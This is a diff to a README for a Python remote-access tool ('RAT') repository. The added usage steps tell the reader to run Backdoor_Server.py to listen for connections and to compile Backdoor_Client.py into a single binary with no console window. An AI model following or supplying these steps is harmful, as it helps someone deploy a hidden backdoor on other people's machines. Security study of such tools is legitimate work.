@@ -4,7 +4,7 @@ Python 2.7.18
 
 Any Kind Of Host Machine
 
-1.Downloaded the repository via github or git eg. git clone https://github.com/Jayachandra-M/Ethical-Hacking.git 
+1.Downloaded the repository via github or git eg. git clone https://github.com/Jayachandra-M/Remote-Administration-Tool-Rat-.git
 2.Install the required modules by running python -m pip install -r requirements.txt
 
 
@@ -14,7 +14,21 @@ Any Kind Of Host Machine
 USAGE:
 
 
-git clone 
+git clone https://github.com/Jayachandra-M/Remote-Administration-Tool-Rat-.git
+
+cd Remote-Administration-Tool-Rat-
+
+chmod +x *
+
+python -m pip install requirements.txt
+
+RUNNING TOOL
+
+./Backdoor_Server.py At The Server Side To Listen For Incoming Connections
+
+Make Backdoor_Client.py Into Binary By
+
+pyinstaller Backdoor_Client.py --onefile --noconsole
 
 
 
